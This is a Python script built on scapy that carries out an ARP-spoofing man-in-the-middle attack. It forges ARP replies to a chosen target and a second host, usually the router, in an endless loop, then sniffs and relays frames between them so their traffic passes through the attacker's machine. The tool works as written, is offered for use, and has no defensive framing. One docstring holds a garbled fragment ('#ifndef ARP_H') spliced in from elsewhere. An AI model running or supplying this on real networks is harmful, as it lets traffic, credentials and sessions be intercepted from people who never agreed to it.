import argparse
import re
import threading

from typing import Tuple
from scapy.all import AsyncSniffer, conf
from scapy.arch import get_if_hwaddr
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sendp


conf.verb = 0
conf.promisc = True


def get_mac(ip: str) -> str:
    """
    This function receives an IP, and uses ARP to find the MAC attached to that IP.
    :param ip: The IP.
    :return: str - The target's MAC.
    """

    arp_request_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answers, _ = srp(arp_request_broadcast, verbose=False)

    # Index 0 - The packet we sent, Index 1 - the packet we received
    first_answer = answers[0]
    received_packet = first_answer[1]

    return received_packet.hwsrc


def process_frame_from_target(own_mac_address: str, frame: Ether, host_mac: str) -> None:
    """
    This function processes a packet sent from our target to the host, and makes sure to change the correct variables before sending it to the host.
    :param own_mac_address: The MAC address of the host that is running this script.
    :param frame: The intercepted frame.
    :param host_mac: Our destination's MAC (AKA router).
    """
    modified_frame = frame.copy()
    modified_frame[Ether].src = own_mac_address
    modified_frame[Ether].dst = host_mac
    sendp(modified_frame, verbose=False)


def process_frame_to_target(own_mac_address: str, frame: Ether, target_host_mac: str) -> None:
    """
    This function processes a packet sent from our target to the host, and makes sure to change the correct variables before sending it to the host.
    :param own_mac_address: The MAC address of the host that is running this script.
    :param frame: The intercepted frame.
    :param victim_mac: The victim host's mac address.
    """
    modified_frame = frame.copy()
    modified_frame[Ether].src = own_mac_address
    modified_frame[Ether].dst = target_host_mac
    sendp(modified_frame, verbose=False)

def active_spoofing(src_ip: str, dst_ip: str, dst_mac: str) -> None:
    """
    This function receives 2 hosts, and acts as the ARP response from the src to the dst.
    :param src_ip: The src ip we want to impose as.
    :param dst_ip: The destination ip we want to trick.
    :param dst_mac: The desti#ifndef ARP_H
    """

    spoof_packet = Ether(dst=dst_mac) / ARP(op=2, psrc=src_ip, pdst=dst_ip, hwdst=dst_mac)
    sendp(spoof_packet, verbose=False)


def active_spoofing_both_sides(target_host_ip: str, target_host_mac: str, replace_host_ip: str, replace_host_mac: str) -> None:
    """
    :param target_host_ip: The target host's IP
    :param target_host_mac: The target host's MAC
    :param replace_host_ip: The replacement host's IP
    :param replace_host_mac: The replacement host's MAC
    """
    while True:
        active_spoofing(target_host_ip, replace_host_ip, replace_host_mac)
        active_spoofing(replace_host_ip, target_host_ip, target_host_mac)

def valid_ip(value: str) -> str:
    """
    Gets a value, and checks if the value follows the IP format.
    :param value: The value we want to check.
    :return: value if it's in the IP format, otherwise raises and error.
    """
    pattern = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if re.match(pattern, value):
        return value
    else:
        raise argparse.ArgumentTypeError(f"{value} is not a valid IP address")


def get_args() -> Tuple[str, str]:
    """
    Receives the arguments passed when running the script
    :return: Tuple[str, str] - target host ip & replace host ip
    """
    parser = argparse.ArgumentParser()

    parser.add_argument("target_host_ip", type=valid_ip, help="Our target, the host we want to attack")
    parser.add_argument("replace_host_ip", type=valid_ip, help="The target's destination we want to impose as")

    args = parser.parse_args()
    return args.target_host_ip, args.replace_host_ip


def main():
    target_host_ip, replace_host_ip = get_args()

    own_mac_address = get_if_hwaddr(conf.iface)

    print("Retrieving both sides MAC addresses")
    target_host_mac = get_mac(target_host_ip)
    replace_host_mac = get_mac(replace_host_ip)

    print(target_host_ip, target_host_mac)
    print(replace_host_ip, replace_host_mac)

    print("Started active spoofing...")
    active_spoofing_thread = threading.Thread(target=lambda: active_spoofing_both_sides(target_host_ip, target_host_mac, replace_host_ip, replace_host_mac))
    active_spoofing_thread.start()

    print("Started intercepting packets")
    sniff_from_target = AsyncSniffer(filter=f"ip src {target_host_ip} and ip dst {replace_host_ip} and not ether src {own_mac_address}",
                      prn=lambda frame: process_frame_from_target(own_mac_address, frame, replace_host_mac), store=0)
    sniff_to_target = AsyncSniffer(filter=f"ip src {replace_host_ip} and ip dst {target_host_ip} and not ether src {own_mac_address}",
                      prn=lambda frame: process_frame_to_target(own_mac_address, frame, target_host_mac), store=0)
    sniff_from_target.start()
    sniff_to_target.start()

    sniff_from_target.join()
    sniff_to_target.join()


if __name__ == "__main__":  
    main()